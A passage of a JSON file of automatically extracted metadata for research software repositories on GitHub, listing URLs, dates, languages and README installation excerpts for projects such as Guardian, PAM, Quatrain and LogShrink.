                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1127
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "231": {
        "filename": "taidnguyen_software_entity_recognition_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/taidnguyen/software_entity_recognition",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-14T06:19:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-30T19:15:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 53782
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "232": {
        "filename": "blockhousetech_guardian_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/blockhousetech/guardian",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can setup Guardian using pip or tox automation tool.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "Guardian",
                        "Running Guardian"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/blockhousetech/guardian/main/README.md"
            },
            {
                "result": {
                    "value": "Run `pip install .` in the main folder of the Guardian repository.\n> :warning: If you get `AttributeError: module 'enum' has no attribute 'IntFlag'` error, check if you have enum34 library installed, which is not compatibile with Python >3.4. You can uninstall it by calling `pip uninstall -y enum34`. This step is not required if you use tox.\n> \n> :warning: If you want to run tests, you need pytest framework. You can either install it via pip or use tox, which installs pytest automatically. If you want to use pip, call `pytest` in the main folder of the Guardian repository.\n",
                    "type": "Text_excerpt",
                    "original_header": "pip",
                    "parent_header": [
                        "Guardian",
                        "Running Guardian",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/blockhousetech/guardian/main/README.md"
            },
            {
                "result": {
                    "value": "Guardian supports tox automation tool. You can install tox using pip by calling `pip install tox`. Once you have tox installed, simply call `tox` in the main folder of the Guardian repository. By default, it will run some tests under Python 3.6, 3.7, and 3.8. You can modify this behaviour by editing the file `tox.ini`.\n",
                    "type": "Text_excerpt",
                    "original_header": "tox",
                    "parent_header": [
                        "Guardian",
                        "Running Guardian",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/blockhousetech/guardian/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "It contains the content of the Guardian tool package that you install, either using tox or pip.\n \n",
                    "original_header": "guardian"
                },
                "confidence": 0.9999332776372448,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/blockhousetech/guardian/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here, you can find a limited number of tests for our tool, together with some SGX enclave binaries they use. The purpose of these tests is to ascertain that violations types are correctly reported and that we do not detect any false-positives. If you set up Guardian using pip, you can run tests by calling `pytest` in the main folder of the Guardian repository. Alternatively, `tox` will run them automatically for you.\n \n",
                    "original_header": "tests"
                },
                "confidence": 0.9837467162484875,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/blockhousetech/guardian/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-11T14:24:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-25T12:47:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 115152
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 89970
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 86957
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 79923
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "233": {
        "filename": "UH-SERG_CI-Memorization_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UH-SERG/CI-Memorization",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  * Variable Misuse (VarMisuse):\n    * Models: [Transformer, GGNN, and Great](https://github.com/VHellendoorn/ICLR20-Great/tree/master/models)\n    * Dataset: [Py150](https://github.com/google-research-datasets/great) \nCheck the following repositories from @AftabHussain for the great variable misuse experiments:  \n- https://github.com/AftabHussain/noise-gen_great-varmisuse  \n- https://github.com/AftabHussain/save-trainstats_great-varmisuse   \n",
                    "original_header": "Experimental Settings:"
                },
                "confidence": 0.9545497817292948,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/UH-SERG/CI-Memorization/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-12T04:57:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-04T18:52:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 215652
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 15396
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 10264
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "234": {
        "filename": "mast-group_api-mining_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mast-group/api-mining",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Simply import as a maven project into [Eclipse](https://eclipse.org/) using the *File -> Import...* menu option (note that this requires [m2eclipse](http://eclipse.org/m2e/)). \n\nIt's also possible to export a runnable jar from Eclipse using the *File -> Export...* menu option.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing in Eclipse",
                    "parent_header": [
                        "PAM: Probabilistic API Miner <a href=\"https://travis-ci.org/mast-group/api-mining\"><img alt=\"Build Status\" src=\"https://travis-ci.org/mast-group/api-mining.svg?branch=master\" /></a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mast-group/api-mining/master/README.md"
            },
            {
                "result": {
                    "value": "To compile a standalone runnable jar, simply run\n\n```\nmvn package\n```\n\nin the top-level directory (note that this requires [maven](https://maven.apache.org/)). This will create the standalone runnable jar ```api-mining-1.0.jar``` in the api-mining/target subdirectory. The main class is *apimining.pam.main.PAM* (see below).\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Compiling a Runnable Jar",
                    "parent_header": [
                        "PAM: Probabilistic API Miner <a href=\"https://travis-ci.org/mast-group/api-mining\"><img alt=\"Build Status\" src=\"https://travis-ci.org/mast-group/api-mining.svg?branch=master\" /></a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mast-group/api-mining/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "PAM takes as input a list of API call sequences in [ARFF](https://weka.wikispaces.com/ARFF+%28stable+version%29) file format\nThe ARFF format is very simple and best illustrated by example. The first few lines from ```netty.arff``` are:\n```text\n@relation netty\n\n@attribute fqCaller string\n@attribute fqCalls string\n\n@data\n'com.torrent4j.net.peerwire.AbstractPeerWireMessage.write','io.netty.buffer.ChannelBuffer.writeByte'\n'com.torrent4j.net.peerwire.messages.BitFieldMessage.writeImpl','io.netty.buffer.ChannelBuffer.writeByte'\n'com.torrent4j.net.peerwire.messages.BitFieldMessage.readImpl','io.netty.buffer.ChannelBuffer.readable io.netty.buffer.ChannelBuffer.readByte'\n'com.torrent4j.net.peerwire.messages.BlockMessage.writeImpl','io.netty.buffer.ChannelBuffer.writeInt io.netty.buffer.ChannelBuffer.writeInt io.netty.buffer.ChannelBuffer.writeBytes'\n'com.torrent4j.net.peerwire.messages.BlockMessage.readImpl','io.netty.buffer.ChannelBuffer.readInt io.netty.buffer.ChannelBuffer.readInt io.netty.buffer.ChannelBuffer.readableBytes io.netty.buffer.ChannelBuffer.readBytes'\n```\n \n",
                    "original_header": "Input Format"
                },
                "confidence": 0.9999982817385541,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/api-mining/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "PAM outputs a list of the most interesting API call patterns (i.e. subsequences of the original API call sequences) ordered by their probability under the model. \nFor example, the first few lines in the output file ```patterns.txt``` for the usage example above are:\n```text\nprob: 0.04878\n[io.netty.channel.Channel.write]\n\nprob: 0.04065\n[io.netty.channel.ExceptionEvent.getCause, io.netty.channel.ExceptionEvent.getChannel]\n\nprob: 0.04065\n[io.netty.channel.ChannelHandlerContext.getChannel]\n\nprob: 0.03252\n[io.netty.channel.Channel.close]\n```\n \n",
                    "original_header": "Output Format"
                },
                "confidence": 0.9993136431414761,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/api-mining/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please report any bugs using GitHub's issue tracker. \n",
                    "original_header": "Bugs"
                },
                "confidence": 0.9946171779528844,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mast-group/api-mining/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-07-02T09:38:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-15T02:59:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 651609
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3853
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2709
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "235": {
        "filename": "Trustworthy-Software_Quatrain_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Trustworthy-Software/Quatrain",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "#### For complete reproduction, please go to [README.md](https://github.com/Trustworthy-Software/Quatrain#readme).\n\n## \u2160) Requirements for Reproduction\n### A) Environment\n  * python 3.7 (Anaconda recommended)\n  * ```pip install -r requirements.txt```\n\nrun `sudo apt-get install python3.7-dev` first if you don't have python3.7 dev package.\n\n### B) Data elements \n  download _ASE2022withTextUnique.zip_ (need to be unzipped) and _ASE_features2_bert.pickle_ from [data in Zenodo](https://zenodo.org/record/6946294#.Yub3NWQzZhE \"Dataset for Quatrain\"), \n  accordingly change the absolute path of these two files in **experiment/config.py** of this repository as below.\n  1. self.path_patch ---> ASE2022withTextUnique.  Original dataset with patches text and commit messages text.\n  2. self.path_ASE2020_feature ---> ASE_features2_bert.pickle. The feature from Tian et al.'s ASE2020 [paper](https://ieeexplore.ieee.org/abstract/document/9286101) for our RQ3 DL experiment. \n\n### C) Test\nExecute the following command to see if you can successfully obtain RQ1 results (Figure 6 & Table 2).\n```\npython run.py RQ1\n```\n\n## \u2161) Custom Prediction\nTo predict the correctness of your custom patches, you are welcome to use the prediction interface.\n### A) Requirements\n  * **BERT model client&server:** 24-layer, 1024-hidden, 16-heads, 340M parameters. download it [here](https://storage.googleapis.com/bert_models/2019_05_30/wwm_cased_L-24_H-1024_A-16.zip).\n    \n  * **Environment for BERT server** (different from reproduction)\n    * python 3.7 \n    * pip install tensorflow==1.14\n    * pip install bert-serving-client==1.10.0\n    * pip install bert-serving-server==1.10.0\n    * pip install protobuf==3.20.1\n    * Launch BERT server via `bert-serving-start -model_dir \"Path2BertModel\"/wwm_cased_L-24_H-1024_A-16 -num_worker=2 -max_seq_len=360 -port 8190`\n    * switch the port in [BERT_Port](https://github.com/Trustworthy-Software/Quatrain/blob/main/representation/word2vec.py#L42) in case your port 8190 is occupied.\n  * **Bug report text:** developer-written bug report.\n  * **Patch description text:** generating patch description for your plausible patches with commit message generation tools, e.g. CodeTrans. [Github](https://github.com/agemagician/CodeTrans) and [API](https://huggingface.co/SEBIS/code_trans_t5_large_commit_generation_transfer_learning_finetune).\n\n### B) Predict\nLet's give it a try!\n```\npython run.py predict $bug_report_text $patch_description_text\n```\nFor instance: `python run.py predict 'Missing type-checks for var_args notation' 'check var_args properly'`\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nartifact_detection_model: a model to detect codes in text.\ndata: processed and structured dataset.\nexperiment: scripts to obtain experimental results of paper. \nfigure: saved figures for experiment\npreprocess: scripts to extract bug reports and commit messages.\nrepresentation: embeddings representation model.\nutils: scripts to deduplicate dataset.\n---------------\nINSTALL.md: installation instructions.\nquatrain_model.h5: pre-trained QUATRAIN model for users' custom prediction.\nrequirements.txt: required dependencies.\nrun.py: entrance to conduct experiment.\n``` \n",
                    "original_header": "Catalogue of Repository"
                },
                "confidence": 0.9998100857162449,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  1. bug report summary: title for bug issue.\n  2. bug report description: detailed description for bug issue.\n  3. patch description: CodeTrans-generated commit message for patch.\n \n",
                    "original_header": "\u2160) Dataset"
                },
                "confidence": 0.9923263246127765,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* [data/bugreport_patch.txt](https://github.com/Trustworthy-Software/Quatrain/blob/main/data/bugreport_patch.txt): 9135 (1591:7544) Pairs of Bug report & Commit message. Structured as `bug-id $$ bug report summary $$ bug report description $$ patchId $$ patch description $$ label`\n* [data/bugreport_patch_json_bert.pickle](https://github.com/Trustworthy-Software/Quatrain/blob/main/data/bugreport_patch_json_bert.pickle): Bert embeddings of Pairs of Bug report & Commit message.\n* data/bugreport_patch_array_bert.pickle: Bert embeddings of paris for 10-fold cross validation.\n \n",
                    "original_header": "A) Table 1: Datasets of labelled patches."
                },
                "confidence": 0.9841082575040132,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Let's give it a try!\n```\npython run.py predict $bug_report_text $patch_description_text\n```\nFor instance: `python run.py predict 'Missing type-checks for var_args notation' 'check var_args properly'`\n \n",
                    "original_header": "B) Predict"
                },
                "confidence": 0.9332492813736711,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To re-train QUATRAIN model on our or other dataset, execute the following steps.\n  1. Structure your dataset as [data/bugreport_patch.txt](https://github.com/Trustworthy-Software/Quatrain/blob/main/data/bugreport_patch.txt). \n  2. Obtain Bert embeddings of your dataset via `experiment/save_bugreport_dataset_json.py`\n  3. Accordingly, change self.dataset_json in experiment/config.py \n  4. Execute `python run.py RQ1`\n \n",
                    "original_header": "\u2164) Custom Train"
                },
                "confidence": 0.9992444785420531,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Trustworthy-Software/Quatrain/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-31T20:50:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-23T09:14:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 326384
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1613
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "236": {
        "filename": "soarsmu_Revisiting_Neuron_Coverage_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/Revisiting_Neuron_Coverage",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npip install gdown\n\ngdown https://drive.google.com/uc?id=1gUiTNIzSF_HSy6HR_Nxo8r5MkUJ-mm_C\ntar -xvf data.tar.gz\n\ngdown https://drive.google.com/uc?id=14up34H2_RVAwYmR2NNJFRI0l-FdI1d_u\ntar -xvf models.tar.gz\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Data Preparation",
                    "parent_header": [
                        "Revisiting Neuron Coverage Metrics and Quality of Deep Neural Networks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/Revisiting_Neuron_Coverage/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Download the `adversarial-robustness-toolbox` and install necessary libraries using the following commands,\n```\napt update\napt install git\ngit clone https://github.com/Trusted-AI/adversarial-robustness-toolbox.git\ncd adversarial-robustness-toolbox\npip install .\n```\n \n",
                    "original_header": "Docker"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/Revisiting_Neuron_Coverage/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Alterantively, use the following command to download:\n```\n# Download the 'data' folder, make sure that you are under the root folder.\ngdown https://drive.google.com/uc?id=1bClp6T9VuvTzSwspVf_zRkZptI31F6XI\n# Decompress it\nunzip data.zip\n\n## Download 'Table 2 data.zip' \ncd Comparison\\ of\\ Attack\\ Images/\ngdown https://drive.google.com/uc?id=1DZK2gY6Gz991FS_5mXtLnsx3ZiVhUNMY\n# Decompress it\nunzip Table\\ 2\\ data.zip \nmv Table\\ 2\\ data/data/ data/\nrm -r Table\\ 2\\ data\n\n## Download 'Table 3 data.zip'\ncd Model\\ Accuracy\\ under\\ Different\\ Scenarios/\ngdown https://drive.google.com/uc?id=18MN6HNT-9DR6cML6r8mInPb4GC7drRBc\nunzip unzip Table\\ 3\\ data.zip\nmv Table\\ 3\\ data/data/ data/\nmv Table\\ 3\\ data/new_model/ new_model/\nrm -r Table\\ 3\\ data\n``` \n",
                    "original_header": "The original Data Source"
                },
                "confidence": 0.9999975039225321,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/Revisiting_Neuron_Coverage/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-11-21T08:26:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-11T09:14:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 634612
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 424786
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 23848
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "237": {
        "filename": "Derek-Jones_SiP_dataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Derek-Jones/SiP_dataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-01-06T23:20:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-09T13:53:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 24093
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "238": {
        "filename": "githubnext_amalfi-artifact_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/githubnext/amalfi-artifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This is the artifact for our ICSE '22 paper \"Practical Automated Detection of Malicious npm Packages\", which presents an approach to automatically detecting malicious npm packages based on a combination of three components: machine-learning classifiers trained on known samples of malicious and benign npm packages; a reproducer for identifying packages that can be rebuilt from source and hence are unlikely to be malicious; and a clone detector for finding copies of known malicious packages. \nWe would like to claim an Artifact Available badge, and hence make this data publicly available at https://github.com/githubnext/amalfi-artifact. No specific technology skills are required to use this data. There are no external dependencies, and no setup is required. \n",
                    "original_header": "Artifact: Practical Automated Detection of Malicious npm Packages"
                },
                "confidence": 0.9747797708301742,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/githubnext/amalfi-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The reproducer is implemented as a Shell script [`code/reproducer/reproduce-package.sh`](code/reproducer/reproduce-package.sh) that, given a package name and a version, uses an auxiliary script [`code/reproducer/build-package.sh`](code/reproducer/build-package.sh) to rebuild the package from source, and then compares the result to the published package.\n \n",
                    "original_header": "Code for reproducing packages"
                },
                "confidence": 0.9383941716255642,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/githubnext/amalfi-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The clone detector is implemented as a Python script [`code/clone-detector/hash_package.py`](code/clone-detector/hash_package.py) which computes an MD5 hash for a package. \n \n",
                    "original_header": "Code for detecting clones"
                },
                "confidence": 0.9508712586857768,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/githubnext/amalfi-artifact/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-06T13:51:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-24T05:58:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 12310
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "239": {
        "filename": "IntelligentDDS_LogShrink_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/IntelligentDDS/LogShrink",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|             | logzip | LogReducer | LogShrink |\n| ----------- | :----: | :--------: | :-------: |\n| Android     | 0.068  |   8.918    |   5.347   |\n| Apache      | 0.737  |   1.686    |   1.880   |\n| BGL         | 0.874  |   18.189   |   2.519   |\n| Hadoop      | 0.901  |   4.919    |   3.137   |\n| HDFS        | 0.701  |   20.570   |   3.253   |\n| HealthApp   | 0.736  |   4.108    |   2.064   |\n| HPC         | 0.644  |   5.110    |   2.485   |\n| Linux       | 0.687  |   0.526    |   1.307   |\n| Mac         | 0.009  |   2.887    |   2.572   |\n| OpenSSH     | 0.715  |   13.268   |   3.409   |\n| OpenStack   | 0.537  |   6.389    |   2.945   |\n| Proxifier   | 0.716  |   0.929    |   1.315   |\n| Spark       | 0.550  |   18.871   |   2.821   |\n| Thunderbird |  ---   |   19.532   |   4.069   |\n| Windows     | 1.357  |   31.938   |   5.507   |\n| Zookeeper   | 0.842  |   3.071    |   2.523   | \n",
                    "original_header": "The overall compression speed of LogShrink"
                },
                "confidence": 0.9969298604477898,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/IntelligentDDS/LogShrink/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-28T05:52:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-13T02:36:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 196625
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 38834
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4533
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 2538
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 261
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "240": {
        "filename": "OpsPAI_iPACK_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpsPAI/iPACK",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "### Installation \n1. Install [python >= 3.8](https://www.python.org/downloads/). \n2. Install the dependency needed by iPACK with the following command. \n   ```pip install -r requirements.txt``` \n"
                },
                "confidence": 0.979581695604435,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpsPAI/iPACK/main/README.MD"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-10T16:42:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-17T11:19:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 55428
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "241": {
        "filename": "evidencebp_e2ese_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evidencebp/e2ese",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-07-28T07:27:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-22T15:32:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 921
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "242": {
        "filename": "rohanpadhye_jqf_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rohanpadhye/JQF",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
